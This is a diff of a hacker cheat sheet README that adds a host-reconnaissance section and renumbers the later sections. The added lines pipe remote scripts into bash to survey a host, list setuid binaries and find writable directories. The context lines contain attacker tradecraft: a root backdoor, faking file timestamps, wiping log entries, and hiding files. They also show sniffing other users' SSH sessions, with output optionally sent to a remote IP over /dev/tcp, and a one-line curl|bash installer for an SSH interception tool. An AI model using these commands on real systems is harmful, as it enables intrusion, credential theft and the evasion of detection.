@@ -73,6 +73,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Remote access an entire network](#backdoor-network)
    1. [Smallest PHP backdoor](#carriage-return-backdoor) 
    1. [Local Root backdoor](#ld-backdoor)
+1. [Host Recon](#hostrecon)
 1. [Shell Hacks](#shell-hacks)
    1. [Shred files (secure delete)](#shred)
    1. [Restore the date of a file](#restore-timestamp)
@@ -1537,11 +1538,59 @@ Become root
 /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
 ```
 
+<a id="hostrecon"></a>
+## 7. Host Recon
+---
+
+Get essential information about a host:
+```sh
+curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/whatserver.sh | bash
+```
+
+Find out the Linux Distribution
+```sh
+uname -a; lsb_release -a 2>/dev/null; cat /etc/*release /etc/issue* /proc/version /etc/hosts 2>/dev/null
+```
+
+netstat if there is no netstat/ss/lsof:
+```sh
+culr -fsSL https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/tools/awk_netstat.sh | bash
+```
+
+Speed check the system
+```sh
+curl -fsSL https://bench.sh | bash
+# Another speed check:  
+# curl -fsSL https://yabs.sh | bash
+```
+
+Find all suid/sgid binaries:
+```
+find  / -xdev -type f -perm /6000  -ls 2>/dev/null
+```
+
+Find all writeable directories:
+```sh
+wfind() {
+    local arr dir
+
+    arr=("$@")
+    while [[ ${#arr[@]} -gt 0 ]]; do
+        dir=${arr[${#arr[@]}-1]}
+        unset 'arr[${#arr[@]}-1]'
+        find "$dir"  -maxdepth 1 -type d -writable -ls 2>/dev/null
+        IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
+    done
+}
+# Usage: wfind /
+# Usage: wfind /etc /var /usr 
+```
+
 ---
 <a id="shell-hacks"></a>
-## 7. Shell Hacks
+## 8. Shell Hacks
 <a id="shred"></a>
-**7.i. Shred & Erase a file**
+**8.i. Shred & Erase a file**
 
 ```sh
 shred -z foobar.txt
@@ -1562,7 +1611,7 @@ Note: Or deploy your files in */dev/shm* directory so that no data is written to
 Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.
 
 <a id="restore-timestamp"></a>
-**7.ii. Restore the date of a file**
+**8.ii. Restore the date of a file**
 
 Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)
 
@@ -1571,7 +1620,7 @@ touch -r /etc/shadow /etc/passwd
 ```
 
 <a id="shell-clean-logs"></a>
-**7.iii. Clear logfile**
+**8.iii. Clear logfile**
 
 This will reset the logfile to 0 without having to restart syslogd etc:
 ```sh
@@ -1588,7 +1637,7 @@ IFS="" a=$(sed "/${DEL}/d" <"${LOG}") && echo "$a">"${LOG}"
 ```
 
 <a id="shell-hide-files"></a>
-**7.iv. Hide files from that User without root privileges**
+**8.iv. Hide files from that User without root privileges**
 
 Our favorite working directory is */dev/shm/*. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.
 
@@ -1615,51 +1664,11 @@ mkdir $'\t'
 cd $'\t'
 ```
 
-<a id="linux-info"></a>
-**7.v. Find out Linux Distro**
-
-```sh
-# Find out Linux Distribution
-uname -a; lsb_release -a 2>/dev/null; cat /etc/*release /etc/issue* /proc/version /etc/hosts 2>/dev/null
-```
-
-```sh
-# Speed check the system
-curl -sL bench.sh | bash
-# Another speed check:  
-# curl -sL yabs.sh | bash
-```
-
-<a id="suid"></a>
-**7.vi. Find +s files / Find writeable directory**
-
-Find all suid/sgid binaries:
-```
-find  / -xdev -type f -perm /6000  -ls 2>/dev/null
-```
-
-Find all writeable directories:
-```sh
-wfind() {
-    local arr dir
-
-    arr=("$@")
-    while [[ ${#arr[@]} -gt 0 ]]; do
-        dir=${arr[${#arr[@]}-1]}
-        unset 'arr[${#arr[@]}-1]'
-        find "$dir"  -maxdepth 1 -type d -writable -ls 2>/dev/null
-        IFS=$'\n' arr+=($(find "$dir" -mindepth 1 -maxdepth 1 -type d ! -writable 2>/dev/null))
-    done
-}
-# Usage: wfind /
-# Usage: wfind /etc /var /usr 
-```
-
 ---
 <a id="crypto"></a>
-## 8. Crypto
+## 9. Crypto
 <a id="gen-password"></a>
-**8.i. Generate quick random Password**
+**9.i. Generate quick random Password**
 
 Good for quick passwords without human element.
 
@@ -1680,7 +1689,7 @@ head -c 32 < /dev/urandom | base64 | tr -dc '[:alnum:]' | head -c 16
 ```
 
 <a id="crypto-filesystem"></a>
-**8.ii.a. Linux transportable encrypted filesystems - cryptsetup**
+**9.ii.a. Linux transportable encrypted filesystems - cryptsetup**
 
 Create a 256MB large encrypted file system. You will be prompted for a password.
 
@@ -1705,7 +1714,7 @@ umount /mnt/sec
 cryptsetup close sec 
 ```
 <a id="encfs"></a>
-**8.ii.b. Linux transportable encrypted filesystems - EncFS**
+**9.ii.b. Linux transportable encrypted filesystems - EncFS**
 
 Create ```.sec``` and store the encrypted data in ```.raw```:
 ```sh
@@ -1719,7 +1728,7 @@ fusermount -u .sec
 ```
 
 <a id="encrypting-file"></a>
-**8.iii Encrypting a file**
+**9.iii Encrypting a file**
 
 Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):
 
@@ -1735,9 +1744,9 @@ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.
 
 ---
 <a id="ssh-sniffing"></a>
-## 9. SSH Sniffing
+## 10. SSH Sniffing
 <a id="ssh-sniffing-script"></a>
-**9.i Sniff a user's SHELL session with script**
+**10.i Sniff a user's SHELL session with script**
 
 A method to log the shell session of a user (who logged in via SSH).
 
@@ -1748,7 +1757,7 @@ echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
 Consider using [zap-args](#bash-hide-arguments) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
 
 <a id="dtrace"></a>
-**9.ii Sniff all SHELL sessions with dtrace - FreeBSD**
+**10.ii Sniff all SHELL sessions with dtrace - FreeBSD**
 
 Especially useful for Solaris/SunOS and FreeBSD (pfSense). It uses kernel probes to trace *all* sshd processes.
 
@@ -1768,7 +1777,7 @@ Start a dtrace and log to /tmp/.log:
 ```
 
 <a id="bpf"></a>
-**9.iii Sniff all SHELL sessions with eBPF - Linux**
+**10.iii Sniff all SHELL sessions with eBPF - Linux**
 
 eBPF allows us to *safely* hook over 120,000 functions in the kernel. It's like a better "dtrace" but for Linux.  
 
@@ -1781,7 +1790,7 @@ curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/pty
 Check out our very own [eBPF tools to sniff sudo/su/ssh passwords](https://github.com/hackerschoice/bpfhacks).
 
 <a id="ssh-sniffing-strace"></a>
-**9.iv Sniff a user's outgoing SSH session with strace**
+**10.iv Sniff a user's outgoing SSH session with strace**
 ```sh
 strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
 ```
@@ -1789,7 +1798,7 @@ Dirty way to monitor a user who is using *ssh* to connect to another host from a
 
 
 <a id="ssh-sniffing-wrapper"></a>
-**9.v. Sniff a user's outgoing SSH session with a wrapper script**
+**10.v. Sniff a user's outgoing SSH session with a wrapper script**
 
 Even dirtier method in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH sessions)
 
@@ -1835,7 +1844,7 @@ To uninstall cut & paste this\033[0m:\033[1;36m
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
 <a id="ssh-sniffing-sshit"></a>
-**9.vi Sniff a user's outgoing SSH session using SSH-IT**
+**10.vi Sniff a user's outgoing SSH session using SSH-IT**
 
 The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).
 
@@ -1844,7 +1853,7 @@ bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
 ```
 
 <a id="hijack"></a>
-**9.vii Hijack / Take-over a running SSH session**  
+**10.vii Hijack / Take-over a running SSH session**  
 
 Use [https://github.com/nelhage/reptyr](https://github.com/nelhage/reptyr) to take over an existing SSH session:
 ```sh
@@ -1856,9 +1865,9 @@ ps ax -o pid,ppid,cmd | grep 'ssh '
 
 ---
 <a id="vpn-shell"></a>
-## 10. VPN & Shells
+## 11. VPN & Shells
 <a id="shell"></a>
-**10.i. Disposable Root Servers**
+**11.i. Disposable Root Servers**
 
 ```console
 $ ssh root@segfault.net # Use password 'segfault'
@@ -1867,7 +1876,7 @@ $ ssh root@segfault.net # Use password 'segfault'
 https://thc.org/segfault
 
 <a id="vpn"></a>
-**10.ii. VPN/VPS/Proxies**
+**11.ii. VPN/VPS/Proxies**
 
 Trusted VPN Providers
 1. https://www.mullvad.net
@@ -1906,7 +1915,7 @@ Many other services (for free)
 
 ---
 <a id="osint"></a>
-## 11. Intelligence Gathering
+## 12. Intelligence Gathering
 
 | OSINT Hacker Tools ||
 | --- | --- |
@@ -1938,9 +1947,9 @@ Many other services (for free)
 
 ---
 <a id="misc"></a>
-## 12. Miscellaneous
+## 13. Miscellaneous
 <a id="tools"></a>
-**12.i. Tools of the trade**
+**13.i. Tools of the trade**
 
 Comms
 1. [CryptoStorm Email](https://www.cs.email/) - Disposable emails (send & receive). (List of [Disposable-email-services](https://github.com/AnarchoTechNYC/meta/wiki/Disposable-email-services])).
@@ -2052,13 +2061,13 @@ Mindmaps & Knowledge
 1. [Active Directory](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)
 
 <a id="cool-linux-commands"></a>
-**12.ii. Cool Linux commands**
+**13.ii. Cool Linux commands**
 
 1. https://jvns.ca/blog/2022/04/12/a-list-of-new-ish--command-line-tools/
 1. https://github.com/ibraheemdev/modern-unix
 
 <a id="tmux"></a>
-**12.iii. Tmux Cheat Sheet**
+**13.iii. Tmux Cheat Sheet**
 
 
 | | Tmux Cheat Sheet |
@@ -2072,7 +2081,7 @@ Mindmaps & Knowledge
 | Menu | `Ctrl+b` + `>`. Then use `Ctrl+b` + `UP`, `DOWN`, `LEFT` or `RIGHT` to move between the panes. |
 
 <a id="useful-commands"></a>
-**12.iv. Useful commands**
+**13.iv. Useful commands**
 
 Use `lsof -Pni` or `netstat -putan` (or `ss -putan`) to list all Internet (_-tu_) connections.
 
@@ -2097,7 +2106,7 @@ rlwrap --always-readline ssh user@host
 ```
 ---
 <a id="others"></a>
-## 13. Other Sites
+## 14. Other Sites
 
 1. [Phineas Fisher](https://blog.isosceles.com/phineas-fisher-hacktivism-and-magic-tricks/) - No nonsense. Direct. How we like it.
 1. [Hacking HackingTeam - a HackBack](https://gist.github.com/jaredsburrows/9e121d2e5f1147ab12a696cf548b90b0) - Old but real talent at work.
